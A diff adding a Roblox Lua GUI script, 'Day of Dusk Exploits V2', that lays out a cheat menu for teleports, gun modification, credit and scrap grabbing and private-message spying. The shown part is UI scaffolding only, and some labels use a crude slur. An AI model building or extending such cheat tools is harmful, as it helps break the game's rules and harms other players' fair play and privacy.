@@ -1,0 +1,2975 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local DayOfDuskExploitsV2 = {
+	DayOfDuskExploitsV2 = Instance.new("ScreenGui"),
+	MainFrame = Instance.new("Frame"),
+	UICorner = Instance.new("UICorner"),
+	TopBar = Instance.new("Frame"),
+	UICorner_2 = Instance.new("UICorner"),
+	Frame = Instance.new("Frame"),
+	TextLabel = Instance.new("TextLabel"),
+	Transition = Instance.new("Frame"),
+	UICorner_3 = Instance.new("UICorner"),
+	MenuFrame = Instance.new("Frame"),
+	CreditsButton = Instance.new("TextButton"),
+	UICorner_4 = Instance.new("UICorner"),
+	InfinateYeildButton = Instance.new("TextButton"),
+	UICorner_5 = Instance.new("UICorner"),
+	MiscButton = Instance.new("TextButton"),
+	UICorner_6 = Instance.new("UICorner"),
+	GunModifierButton = Instance.new("TextButton"),
+	UICorner_7 = Instance.new("UICorner"),
+	TeleportsButton = Instance.new("TextButton"),
+	UICorner_8 = Instance.new("UICorner"),
+	InfoButton = Instance.new("TextButton"),
+	UICorner_9 = Instance.new("UICorner"),
+	SettingsButton = Instance.new("TextButton"),
+	UICorner_10 = Instance.new("UICorner"),
+	GunModifyStart = Instance.new("TextButton"),
+	UICorner_11 = Instance.new("UICorner"),
+	CreditsFrame = Instance.new("Frame"),
+	BackToMenuButton1 = Instance.new("TextButton"),
+	UICorner_12 = Instance.new("UICorner"),
+	MadeBy = Instance.new("TextLabel"),
+	UICorner_13 = Instance.new("UICorner"),
+	CreditsDescription = Instance.new("TextLabel"),
+	UICorner_14 = Instance.new("UICorner"),
+	CreditsLabel = Instance.new("TextLabel"),
+	UICorner_15 = Instance.new("UICorner"),
+	InfoFrame = Instance.new("Frame"),
+	BackToMenuButton2 = Instance.new("TextButton"),
+	UICorner_16 = Instance.new("UICorner"),
+	InfoShort = Instance.new("TextLabel"),
+	UICorner_17 = Instance.new("UICorner"),
+	InfoDescription1 = Instance.new("TextLabel"),
+	UICorner_18 = Instance.new("UICorner"),
+	InfoLabel = Instance.new("TextLabel"),
+	UICorner_19 = Instance.new("UICorner"),
+	InfoDescription2 = Instance.new("TextLabel"),
+	UICorner_20 = Instance.new("UICorner"),
+	InfoDescription3 = Instance.new("TextLabel"),
+	UICorner_21 = Instance.new("UICorner"),
+	InfoDescription4 = Instance.new("TextLabel"),
+	UICorner_22 = Instance.new("UICorner"),
+	InfoDescription5 = Instance.new("TextLabel"),
+	UICorner_23 = Instance.new("UICorner"),
+	SettingsFrame = Instance.new("Frame"),
+	BackToMenuButton3 = Instance.new("TextButton"),
+	UICorner_24 = Instance.new("UICorner"),
+	SettingsShort = Instance.new("TextLabel"),
+	UICorner_25 = Instance.new("UICorner"),
+	SettingsLabel = Instance.new("TextLabel"),
+	UICorner_26 = Instance.new("UICorner"),
+	CheckBox1 = Instance.new("Frame"),
+	CheckBoxFill1 = Instance.new("Frame"),
+	CheckButton1 = Instance.new("ImageButton"),
+	CheckLabel1 = Instance.new("TextLabel"),
+	CheckBox2 = Instance.new("Frame"),
+	CheckBoxFill2 = Instance.new("Frame"),
+	CheckButton2 = Instance.new("ImageButton"),
+	CheckLabel2 = Instance.new("TextLabel"),
+	Minimise = Instance.new("TextButton"),
+	UICorner_27 = Instance.new("UICorner"),
+	Close = Instance.new("TextButton"),
+	UICorner_28 = Instance.new("UICorner"),
+	MinimiseLabel = Instance.new("TextLabel"),
+	CloseLabel = Instance.new("TextLabel"),
+	MiscFrame = Instance.new("Frame"),
+	CreditGrab = Instance.new("TextButton"),
+	UICorner_29 = Instance.new("UICorner"),
+	Time = Instance.new("TextButton"),
+	UICorner_30 = Instance.new("UICorner"),
+	PMSpy = Instance.new("TextButton"),
+	UICorner_31 = Instance.new("UICorner"),
+	MiscLabel = Instance.new("TextLabel"),
+	UICorner_32 = Instance.new("UICorner"),
+	BackToMenu4 = Instance.new("TextButton"),
+	UICorner_33 = Instance.new("UICorner"),
+	NotInUse2 = Instance.new("TextButton"),
+	UICorner_34 = Instance.new("UICorner"),
+	AnimGui = Instance.new("TextButton"),
+	UICorner_35 = Instance.new("UICorner"),
+	ScrapGrab = Instance.new("TextButton"),
+	UICorner_36 = Instance.new("UICorner"),
+	NotInUse1 = Instance.new("TextButton"),
+	UICorner_37 = Instance.new("UICorner"),
+	Reviz = Instance.new("TextButton"),
+	UICorner_38 = Instance.new("UICorner"),
+	MiscShort = Instance.new("TextLabel"),
+	UICorner_39 = Instance.new("UICorner"),
+	TeleportFrame = Instance.new("Frame"),
+	UICorner_40 = Instance.new("UICorner"),
+	TopBar_2 = Instance.new("Frame"),
+	UICorner_41 = Instance.new("UICorner"),
+	Frame_2 = Instance.new("Frame"),
+	TextLabel_2 = Instance.new("TextLabel"),
+	Transition_2 = Instance.new("Frame"),
+	UICorner_42 = Instance.new("UICorner"),
+	Page1 = Instance.new("Frame"),
+	TeleportLabel1 = Instance.new("TextLabel"),
+	UICorner_43 = Instance.new("UICorner"),
+	BackToMenu5 = Instance.new("TextButton"),
+	UICorner_44 = Instance.new("UICorner"),
+	NextPage1 = Instance.new("TextButton"),
+	UICorner_45 = Instance.new("UICorner"),
+	PreviousPage1 = Instance.new("TextButton"),
+	UICorner_46 = Instance.new("UICorner"),
+	ScrapCrate = Instance.new("TextButton"),
+	UICorner_47 = Instance.new("UICorner"),
+	BatteryCrate = Instance.new("TextButton"),
+	UICorner_48 = Instance.new("UICorner"),
+	SubjectSwitch = Instance.new("TextButton"),
+	UICorner_49 = Instance.new("UICorner"),
+	PrisonCells = Instance.new("TextButton"),
+	UICorner_50 = Instance.new("UICorner"),
+	PrisonOverlook = Instance.new("TextButton"),
+	UICorner_51 = Instance.new("UICorner"),
+	InterviewRoom = Instance.new("TextButton"),
+	UICorner_52 = Instance.new("UICorner"),
+	IntogRoom = Instance.new("TextButton"),
+	UICorner_53 = Instance.new("UICorner"),
+	TortureRoom = Instance.new("TextButton"),
+	UICorner_54 = Instance.new("UICorner"),
+	ChillZone = Instance.new("TextButton"),
+	UICorner_55 = Instance.new("UICorner"),
+	GayAssSpawn = Instance.new("TextButton"),
+	UICorner_56 = Instance.new("UICorner"),
+	GayAssChair = Instance.new("TextButton"),
+	UICorner_57 = Instance.new("UICorner"),
+	SCRoom = Instance.new("TextButton"),
+	UICorner_58 = Instance.new("UICorner"),
+	Page2 = Instance.new("Frame"),
+	TeleportLabel2 = Instance.new("TextLabel"),
+	UICorner_59 = Instance.new("UICorner"),
+	BackToMenu6 = Instance.new("TextButton"),
+	UICorner_60 = Instance.new("UICorner"),
+	NextPage2 = Instance.new("TextButton"),
+	UICorner_61 = Instance.new("UICorner"),
+	PreviousPage2 = Instance.new("TextButton"),
+	UICorner_62 = Instance.new("UICorner"),
+	Lab3 = Instance.new("TextButton"),
+	UICorner_63 = Instance.new("UICorner"),
+	Lab2 = Instance.new("TextButton"),
+	UICorner_64 = Instance.new("UICorner"),
+	Lab1 = Instance.new("TextButton"),
+	UICorner_65 = Instance.new("UICorner"),
+	Hangar = Instance.new("TextButton"),
+	UICorner_66 = Instance.new("UICorner"),
+	Bunker = Instance.new("TextButton"),
+	UICorner_67 = Instance.new("UICorner"),
+	BatteryParts = Instance.new("TextButton"),
+	UICorner_68 = Instance.new("UICorner"),
+	Refinery = Instance.new("TextButton"),
+	UICorner_69 = Instance.new("UICorner"),
+	Z14Entrance = Instance.new("TextButton"),
+	UICorner_70 = Instance.new("UICorner"),
+	FedorialiteOre = Instance.new("TextButton"),
+	UICorner_71 = Instance.new("UICorner"),
+	SV = Instance.new("TextButton"),
+	UICorner_72 = Instance.new("UICorner"),
+	OrangaOre = Instance.new("TextButton"),
+	UICorner_73 = Instance.new("UICorner"),
+	ShadowRealm = Instance.new("TextButton"),
+	UICorner_74 = Instance.new("UICorner"),
+	Page3 = Instance.new("Frame"),
+	TeleportLabel3 = Instance.new("TextLabel"),
+	UICorner_75 = Instance.new("UICorner"),
+	BackToMenu7 = Instance.new("TextButton"),
+	UICorner_76 = Instance.new("UICorner"),
+	NextPage3 = Instance.new("TextButton"),
+	UICorner_77 = Instance.new("UICorner"),
+	PreviousPage3 = Instance.new("TextButton"),
+	UICorner_78 = Instance.new("UICorner"),
+	Dew_Crack = Instance.new("TextButton"),
+	UICorner_79 = Instance.new("UICorner"),
+	TowerTop = Instance.new("TextButton"),
+	UICorner_80 = Instance.new("UICorner"),
+	DiamondOre = Instance.new("TextButton"),
+	UICorner_81 = Instance.new("UICorner"),
+	GoldOre = Instance.new("TextButton"),
+	UICorner_82 = Instance.new("UICorner"),
+	City = Instance.new("TextButton"),
+	UICorner_83 = Instance.new("UICorner"),
+	GateButton = Instance.new("TextButton"),
+	UICorner_84 = Instance.new("UICorner"),
+	GateRoom = Instance.new("TextButton"),
+	UICorner_85 = Instance.new("UICorner"),
+	RoofBunker = Instance.new("TextButton"),
+	UICorner_86 = Instance.new("UICorner"),
+	Warehouse = Instance.new("TextButton"),
+	UICorner_87 = Instance.new("UICorner"),
+	Coolant = Instance.new("TextButton"),
+	UICorner_88 = Instance.new("UICorner"),
+	ReactorOut = Instance.new("TextButton"),
+	UICorner_89 = Instance.new("UICorner"),
+	ReactorIn = Instance.new("TextButton"),
+	UICorner_90 = Instance.new("UICorner"),
+	Page4 = Instance.new("Frame"),
+	TeleportLabel4 = Instance.new("TextLabel"),
+	UICorner_91 = Instance.new("UICorner"),
+	BackToMenu8 = Instance.new("TextButton"),
+	UICorner_92 = Instance.new("UICorner"),
+	NextPage4 = Instance.new("TextButton"),
+	UICorner_93 = Instance.new("UICorner"),
+	PreviousPage4 = Instance.new("TextButton"),
+	UICorner_94 = Instance.new("UICorner"),
+	Death = Instance.new("TextButton"),
+	UICorner_95 = Instance.new("UICorner"),
+	AegisSpawn = Instance.new("TextButton"),
+	UICorner_96 = Instance.new("UICorner"),
+	Caves = Instance.new("TextButton"),
+	UICorner_97 = Instance.new("UICorner"),
+	Rockstar = Instance.new("TextButton"),
+	UICorner_98 = Instance.new("UICorner"),
+	RockStarOverlook = Instance.new("TextButton"),
+	UICorner_99 = Instance.new("UICorner"),
+	ExteriorCompound = Instance.new("TextButton"),
+	UICorner_100 = Instance.new("UICorner"),
+	HangarPit = Instance.new("TextButton"),
+	UICorner_101 = Instance.new("UICorner"),
+	Sewer = Instance.new("TextButton"),
+	UICorner_102 = Instance.new("UICorner"),
+	PoliaxVendor = Instance.new("TextButton"),
+	UICorner_103 = Instance.new("UICorner"),
+	Jokeumbia = Instance.new("TextButton"),
+	UICorner_104 = Instance.new("UICorner"),
+	Sandingo = Instance.new("TextButton"),
+	UICorner_105 = Instance.new("UICorner"),
+	Roseweld = Instance.new("TextButton"),
+	UICorner_106 = Instance.new("UICorner"),
+	GunModFrame = Instance.new("Frame"),
+	UICorner_107 = Instance.new("UICorner"),
+	TopBar_3 = Instance.new("Frame"),
+	UICorner_108 = Instance.new("UICorner"),
+	Frame_3 = Instance.new("Frame"),
+	TextLabel_3 = Instance.new("TextLabel"),
+	Transition_3 = Instance.new("Frame"),
+	UICorner_109 = Instance.new("UICorner"),
+	BackToMenu9 = Instance.new("TextButton"),
+	UICorner_110 = Instance.new("UICorner"),
+	ExteriorCompound_2 = Instance.new("TextButton"),
+	UICorner_111 = Instance.new("UICorner"),
+	PoliaxVendor_2 = Instance.new("TextButton"),
+	UICorner_112 = Instance.new("UICorner"),
+	Recoil = Instance.new("TextBox"),
+	UICorner_113 = Instance.new("UICorner"),
+	MaxClip = Instance.new("TextBox"),
+	UICorner_114 = Instance.new("UICorner"),
+	FireRate = Instance.new("TextBox"),
+	UICorner_115 = Instance.new("UICorner"),
+	FireMode = Instance.new("TextBox"),
+	UICorner_116 = Instance.new("UICorner"),
+	GunModLabel1 = Instance.new("TextLabel"),
+	UICorner_117 = Instance.new("UICorner"),
+	MaxClipLabel = Instance.new("TextLabel"),
+	UICorner_118 = Instance.new("UICorner"),
+	RecoilLabel = Instance.new("TextLabel"),
+	UICorner_119 = Instance.new("UICorner"),
+	FireRateLabel = Instance.new("TextLabel"),
+	UICorner_120 = Instance.new("UICorner"),
+	GunModeLabel = Instance.new("TextLabel"),
+	UICorner_121 = Instance.new("UICorner"),
+	MaximiseFrame = Instance.new("Frame"),
+	UICorner_122 = Instance.new("UICorner"),
+	TopBar_4 = Instance.new("Frame"),
+	UICorner_123 = Instance.new("UICorner"),
+	Frame_4 = Instance.new("Frame"),
+	TextLabel_4 = Instance.new("TextLabel"),
+	Transition_4 = Instance.new("Frame"),
+	UICorner_124 = Instance.new("UICorner"),
+	Maximise = Instance.new("Frame"),
+	Maximise_2 = Instance.new("TextButton"),
+	UICorner_125 = Instance.new("UICorner"),
+	Close_2 = Instance.new("TextButton"),
+	UICorner_126 = Instance.new("UICorner"),
+	Sound_1 = Instance.new("Sound"),
+	Sound_2 = Instance.new("Sound"),
+	Sound_3 = Instance.new("Sound"),
+}
+
+--Properties:
+
+DayOfDuskExploitsV2.DayOfDuskExploitsV2.Name = "DayOfDuskExploitsV2"
+DayOfDuskExploitsV2.DayOfDuskExploitsV2.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+DayOfDuskExploitsV2.DayOfDuskExploitsV2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+DayOfDuskExploitsV2.MainFrame.Name = "MainFrame"
+DayOfDuskExploitsV2.MainFrame.Parent = DayOfDuskExploitsV2.DayOfDuskExploitsV2
+DayOfDuskExploitsV2.MainFrame.Active = true
+DayOfDuskExploitsV2.MainFrame.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+DayOfDuskExploitsV2.MainFrame.Position = UDim2.new(0, 0, 0.244000003, 0)
+DayOfDuskExploitsV2.MainFrame.Size = UDim2.new(0, 205, 0, 318)
+
+DayOfDuskExploitsV2.UICorner.Parent = DayOfDuskExploitsV2.MainFrame
+
+DayOfDuskExploitsV2.TopBar.Name = "TopBar"
+DayOfDuskExploitsV2.TopBar.Parent = DayOfDuskExploitsV2.MainFrame
+DayOfDuskExploitsV2.TopBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+DayOfDuskExploitsV2.TopBar.Size = UDim2.new(0, 205, 0, 58)
+
+DayOfDuskExploitsV2.UICorner_2.Parent = DayOfDuskExploitsV2.TopBar
+
+DayOfDuskExploitsV2.Frame.Parent = DayOfDuskExploitsV2.TopBar
+DayOfDuskExploitsV2.Frame.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+DayOfDuskExploitsV2.Frame.BorderSizePixel = 0
+DayOfDuskExploitsV2.Frame.Position = UDim2.new(0, 0, 0.741379321, 0)
+DayOfDuskExploitsV2.Frame.Size = UDim2.new(0, 205, 0, 15)
+
+DayOfDuskExploitsV2.TextLabel.Parent = DayOfDuskExploitsV2.TopBar
+DayOfDuskExploitsV2.TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DayOfDuskExploitsV2.TextLabel.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.TextLabel.Position = UDim2.new(0.0407650843, 0, 0.120689653, 0)
+DayOfDuskExploitsV2.TextLabel.Size = UDim2.new(0, 188, 0, 29)
+DayOfDuskExploitsV2.TextLabel.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.TextLabel.Text = "Day of Dusk Exploits V2"
+DayOfDuskExploitsV2.TextLabel.TextColor3 = Color3.fromRGB(170, 0, 127)
+DayOfDuskExploitsV2.TextLabel.TextScaled = true
+DayOfDuskExploitsV2.TextLabel.TextSize = 14.000
+DayOfDuskExploitsV2.TextLabel.TextWrapped = true
+
+DayOfDuskExploitsV2.Transition.Name = "Transition"
+DayOfDuskExploitsV2.Transition.Parent = DayOfDuskExploitsV2.MainFrame
+DayOfDuskExploitsV2.Transition.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+DayOfDuskExploitsV2.Transition.BorderSizePixel = 0
+DayOfDuskExploitsV2.Transition.Position = UDim2.new(0, 0, 0.135220125, 0)
+DayOfDuskExploitsV2.Transition.Size = UDim2.new(0, 205, 0, 0)
+DayOfDuskExploitsV2.Transition.ZIndex = 10
+
+DayOfDuskExploitsV2.UICorner_3.Parent = DayOfDuskExploitsV2.Transition
+
+DayOfDuskExploitsV2.MenuFrame.Name = "MenuFrame"
+DayOfDuskExploitsV2.MenuFrame.Parent = DayOfDuskExploitsV2.MainFrame
+DayOfDuskExploitsV2.MenuFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DayOfDuskExploitsV2.MenuFrame.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.MenuFrame.Size = UDim2.new(1, 0, 1, 0)
+
+DayOfDuskExploitsV2.CreditsButton.Name = "CreditsButton"
+DayOfDuskExploitsV2.CreditsButton.Parent = DayOfDuskExploitsV2.MenuFrame
+DayOfDuskExploitsV2.CreditsButton.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.CreditsButton.Position = UDim2.new(0.0358870327, 0, 0.905660391, 0)
+DayOfDuskExploitsV2.CreditsButton.Size = UDim2.new(0, 188, 0, 20)
+DayOfDuskExploitsV2.CreditsButton.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.CreditsButton.Text = "Credits"
+DayOfDuskExploitsV2.CreditsButton.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.CreditsButton.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_4.Parent = DayOfDuskExploitsV2.CreditsButton
+
+DayOfDuskExploitsV2.InfinateYeildButton.Name = "InfinateYeildButton"
+DayOfDuskExploitsV2.InfinateYeildButton.Parent = DayOfDuskExploitsV2.MenuFrame
+DayOfDuskExploitsV2.InfinateYeildButton.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.InfinateYeildButton.Position = UDim2.new(0.0407650843, 0, 0.575445592, 0)
+DayOfDuskExploitsV2.InfinateYeildButton.Size = UDim2.new(0, 188, 0, 32)
+DayOfDuskExploitsV2.InfinateYeildButton.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.InfinateYeildButton.Text = "Infinite Yeild"
+DayOfDuskExploitsV2.InfinateYeildButton.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.InfinateYeildButton.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_5.Parent = DayOfDuskExploitsV2.InfinateYeildButton
+
+DayOfDuskExploitsV2.MiscButton.Name = "MiscButton"
+DayOfDuskExploitsV2.MiscButton.Parent = DayOfDuskExploitsV2.MenuFrame
+DayOfDuskExploitsV2.MiscButton.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.MiscButton.Position = UDim2.new(0.0407650843, 0, 0.445312321, 0)
+DayOfDuskExploitsV2.MiscButton.Size = UDim2.new(0, 188, 0, 32)
+DayOfDuskExploitsV2.MiscButton.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.MiscButton.Text = "Miscellaneous scripts"
+DayOfDuskExploitsV2.MiscButton.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.MiscButton.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_6.Parent = DayOfDuskExploitsV2.MiscButton
+
+DayOfDuskExploitsV2.GunModifierButton.Name = "GunModifierButton"
+DayOfDuskExploitsV2.GunModifierButton.Parent = DayOfDuskExploitsV2.MenuFrame
+DayOfDuskExploitsV2.GunModifierButton.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.GunModifierButton.Position = UDim2.new(0.0358870327, 0, 0.312523216, 0)
+DayOfDuskExploitsV2.GunModifierButton.Size = UDim2.new(0, 86, 0, 32)
+DayOfDuskExploitsV2.GunModifierButton.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.GunModifierButton.Text = "Gun Mod Config"
+DayOfDuskExploitsV2.GunModifierButton.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.GunModifierButton.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_7.Parent = DayOfDuskExploitsV2.GunModifierButton
+
+DayOfDuskExploitsV2.TeleportsButton.Name = "TeleportsButton"
+DayOfDuskExploitsV2.TeleportsButton.Parent = DayOfDuskExploitsV2.MenuFrame
+DayOfDuskExploitsV2.TeleportsButton.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.TeleportsButton.Position = UDim2.new(0.0407650843, 0, 0.18238993, 0)
+DayOfDuskExploitsV2.TeleportsButton.Size = UDim2.new(0, 188, 0, 32)
+DayOfDuskExploitsV2.TeleportsButton.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.TeleportsButton.Text = "Teleports"
+DayOfDuskExploitsV2.TeleportsButton.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.TeleportsButton.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_8.Parent = DayOfDuskExploitsV2.TeleportsButton
+
+DayOfDuskExploitsV2.InfoButton.Name = "InfoButton"
+DayOfDuskExploitsV2.InfoButton.Parent = DayOfDuskExploitsV2.MenuFrame
+DayOfDuskExploitsV2.InfoButton.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.InfoButton.Position = UDim2.new(0.0362439007, 0, 0.823899388, 0)
+DayOfDuskExploitsV2.InfoButton.Size = UDim2.new(0, 188, 0, 20)
+DayOfDuskExploitsV2.InfoButton.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.InfoButton.Text = "Infomation"
+DayOfDuskExploitsV2.InfoButton.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.InfoButton.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_9.Parent = DayOfDuskExploitsV2.InfoButton
+
+DayOfDuskExploitsV2.SettingsButton.Name = "SettingsButton"
+DayOfDuskExploitsV2.SettingsButton.Parent = DayOfDuskExploitsV2.MenuFrame
+DayOfDuskExploitsV2.SettingsButton.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.SettingsButton.Position = UDim2.new(0.0407650843, 0, 0.742138386, 0)
+DayOfDuskExploitsV2.SettingsButton.Size = UDim2.new(0, 188, 0, 20)
+DayOfDuskExploitsV2.SettingsButton.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.SettingsButton.Text = "Settings"
+DayOfDuskExploitsV2.SettingsButton.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.SettingsButton.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_10.Parent = DayOfDuskExploitsV2.SettingsButton
+
+DayOfDuskExploitsV2.GunModifyStart.Name = "GunModifyStart"
+DayOfDuskExploitsV2.GunModifyStart.Parent = DayOfDuskExploitsV2.MenuFrame
+DayOfDuskExploitsV2.GunModifyStart.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.GunModifyStart.Position = UDim2.new(0.533447981, 0, 0.312523216, 0)
+DayOfDuskExploitsV2.GunModifyStart.Size = UDim2.new(0, 86, 0, 32)
+DayOfDuskExploitsV2.GunModifyStart.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.GunModifyStart.Text = "Modify Gun"
+DayOfDuskExploitsV2.GunModifyStart.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.GunModifyStart.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_11.Parent = DayOfDuskExploitsV2.GunModifyStart
+
+DayOfDuskExploitsV2.CreditsFrame.Name = "CreditsFrame"
+DayOfDuskExploitsV2.CreditsFrame.Parent = DayOfDuskExploitsV2.MainFrame
+DayOfDuskExploitsV2.CreditsFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DayOfDuskExploitsV2.CreditsFrame.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.CreditsFrame.Size = UDim2.new(1, 0, 1, 0)
+DayOfDuskExploitsV2.CreditsFrame.Visible = false
+
+DayOfDuskExploitsV2.BackToMenuButton1.Name = "BackToMenuButton1"
+DayOfDuskExploitsV2.BackToMenuButton1.Parent = DayOfDuskExploitsV2.CreditsFrame
+DayOfDuskExploitsV2.BackToMenuButton1.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.BackToMenuButton1.Position = UDim2.new(0.0456431322, 0, 0.905660391, 0)
+DayOfDuskExploitsV2.BackToMenuButton1.Size = UDim2.new(0, 188, 0, 20)
+DayOfDuskExploitsV2.BackToMenuButton1.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.BackToMenuButton1.Text = "Back to menu"
+DayOfDuskExploitsV2.BackToMenuButton1.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.BackToMenuButton1.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_12.Parent = DayOfDuskExploitsV2.BackToMenuButton1
+
+DayOfDuskExploitsV2.MadeBy.Name = "MadeBy"
+DayOfDuskExploitsV2.MadeBy.Parent = DayOfDuskExploitsV2.CreditsFrame
+DayOfDuskExploitsV2.MadeBy.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.MadeBy.Position = UDim2.new(0.050999999, 0, 0.31400001, 0)
+DayOfDuskExploitsV2.MadeBy.Size = UDim2.new(0, 188, 0, 28)
+DayOfDuskExploitsV2.MadeBy.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.MadeBy.Text = "This gui was made by [REDACTED]"
+DayOfDuskExploitsV2.MadeBy.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.MadeBy.TextSize = 14.000
+DayOfDuskExploitsV2.MadeBy.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_13.Parent = DayOfDuskExploitsV2.MadeBy
+
+DayOfDuskExploitsV2.CreditsDescription.Name = "CreditsDescription"
+DayOfDuskExploitsV2.CreditsDescription.Parent = DayOfDuskExploitsV2.CreditsFrame
+DayOfDuskExploitsV2.CreditsDescription.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.CreditsDescription.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.CreditsDescription.BorderColor3 = Color3.fromRGB(27, 42, 53)
+DayOfDuskExploitsV2.CreditsDescription.Position = UDim2.new(0.050999999, 0, 0.425000012, 0)
+DayOfDuskExploitsV2.CreditsDescription.Size = UDim2.new(0, 188, 0, 140)
+DayOfDuskExploitsV2.CreditsDescription.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.CreditsDescription.Text = "Sadly, I can't expose my discord/roblox username. This is due to the fact that I am not currently banned from DoD and I want to keep it that way. If I ever do get banned, I will update this gui with my roblox and discord usernames."
+DayOfDuskExploitsV2.CreditsDescription.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.CreditsDescription.TextScaled = true
+DayOfDuskExploitsV2.CreditsDescription.TextSize = 14.000
+DayOfDuskExploitsV2.CreditsDescription.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_14.Parent = DayOfDuskExploitsV2.CreditsDescription
+
+DayOfDuskExploitsV2.CreditsLabel.Name = "CreditsLabel"
+DayOfDuskExploitsV2.CreditsLabel.Parent = DayOfDuskExploitsV2.CreditsFrame
+DayOfDuskExploitsV2.CreditsLabel.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.CreditsLabel.Position = UDim2.new(0.050999999, 0, 0.181999996, 0)
+DayOfDuskExploitsV2.CreditsLabel.Size = UDim2.new(0, 188, 0, 24)
+DayOfDuskExploitsV2.CreditsLabel.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.CreditsLabel.Text = "Credits"
+DayOfDuskExploitsV2.CreditsLabel.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.CreditsLabel.TextScaled = true
+DayOfDuskExploitsV2.CreditsLabel.TextSize = 14.000
+DayOfDuskExploitsV2.CreditsLabel.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_15.Parent = DayOfDuskExploitsV2.CreditsLabel
+
+DayOfDuskExploitsV2.InfoFrame.Name = "InfoFrame"
+DayOfDuskExploitsV2.InfoFrame.Parent = DayOfDuskExploitsV2.MainFrame
+DayOfDuskExploitsV2.InfoFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DayOfDuskExploitsV2.InfoFrame.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.InfoFrame.Size = UDim2.new(1, 0, 1, 0)
+DayOfDuskExploitsV2.InfoFrame.Visible = false
+
+DayOfDuskExploitsV2.BackToMenuButton2.Name = "BackToMenuButton2"
+DayOfDuskExploitsV2.BackToMenuButton2.Parent = DayOfDuskExploitsV2.InfoFrame
+DayOfDuskExploitsV2.BackToMenuButton2.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.BackToMenuButton2.Position = UDim2.new(0.0456431322, 0, 0.905660391, 0)
+DayOfDuskExploitsV2.BackToMenuButton2.Size = UDim2.new(0, 188, 0, 20)
+DayOfDuskExploitsV2.BackToMenuButton2.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.BackToMenuButton2.Text = "Back to menu"
+DayOfDuskExploitsV2.BackToMenuButton2.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.BackToMenuButton2.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_16.Parent = DayOfDuskExploitsV2.BackToMenuButton2
+
+DayOfDuskExploitsV2.InfoShort.Name = "InfoShort"
+DayOfDuskExploitsV2.InfoShort.Parent = DayOfDuskExploitsV2.InfoFrame
